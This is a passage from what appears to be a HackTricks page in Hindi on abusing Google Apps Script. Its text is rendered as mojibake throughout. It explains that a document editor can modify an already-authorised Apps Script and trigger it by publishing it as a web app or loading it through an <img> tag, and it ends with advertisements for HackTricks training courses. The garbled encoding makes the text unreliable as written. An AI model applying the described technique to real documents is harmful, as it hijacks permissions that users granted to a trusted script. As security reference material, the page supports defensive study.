рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ, рдХрд┐ **рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХрд╛ рдирд┐рд░реНрдорд╛рддрд╛ рдХрд┐рд╕реА рднреА App Script рдХрд╛ рдирд┐рд░реНрдорд╛рддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗрдЧрд╛** рдЬрд┐рд╕реЗ рдХреЛрдИ рднреА рд╕рдВрдкрд╛рджрдХ рдкрд╣реБрдВрдЪ рдХреЗ рд╕рд╛рде рдЗрд╕рдХреЗ рдЕрдВрджрд░ рдмрдирд╛рддрд╛ рд╣реИред

рдЗрд╕рдХрд╛ рдорддрд▓рдм рдпрд╣ рднреА рд╣реИ рдХрд┐ **App Script рдХреЛ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдХреЗ рдирд┐рд░реНрдорд╛рддрд╛ рдХреЗ Workspace рд╡рд╛рддрд╛рд╡рд░рдг рджреНрд╡рд╛рд░рд╛ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдорд╛рдирд╛ рдЬрд╛рдПрдЧрд╛ред**
{% endhint %}

{% hint style="danger" %}
рдЗрд╕рдХрд╛ рдорддрд▓рдм рдпрд╣ рднреА рд╣реИ рдХрд┐ рдпрджрд┐ рдПрдХ **App Script рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рд╣реИ** рдФрд░ рд▓реЛрдЧреЛрдВ рдиреЗ **рдкрд╣реБрдБрдЪ рджреА рд╣реИ**, рддреЛ рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рдкрд░ **рд╕рдВрдкрд╛рджрдХ** рдЕрдиреБрдорддрд┐ рд╡рд╛рд▓реЗ рдХреЛрдИ рднреА рд╡реНрдпрдХреНрддрд┐ **рдЗрд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЙрд╕ рдкрд╣реБрдВрдЪ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред**\
рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рд▓реЛрдЧреЛрдВ рдХреЛ App Script рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреА рднреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред рдФрд░ рдПрдХ рдЕрдЪреНрдЫрд╛ рдЯреНрд░рд┐рдХ рд╣реИ рдХрд┐ **рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛ рдПрдХ рд╡реЗрдм рдРрдк рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рдХрд╛рд╢рд┐рдд рдХрд░реЗрдВ**ред рдЬрдм **рд▓реЛрдЧ** рдЬреЛ рдкрд╣рд▓реЗ рд╕реЗ **рдкрд╣реБрдБрдЪ** рджреЗ рдЪреБрдХреЗ рд╣реИрдВ, рд╡реЗрдм рдкреГрд╖реНрда рддрдХ рдкрд╣реБрдБрдЪрддреЗ рд╣реИрдВ, рддреЛ рд╡реЗ **App Script рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВрдЧреЗ** (рдпрд╣ `<img>` рдЯреИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рднреА рдХрд╛рдо рдХрд░рддрд╛ рд╣реИ)ред
{% endhint %}

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ PR рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
{% endhint %}
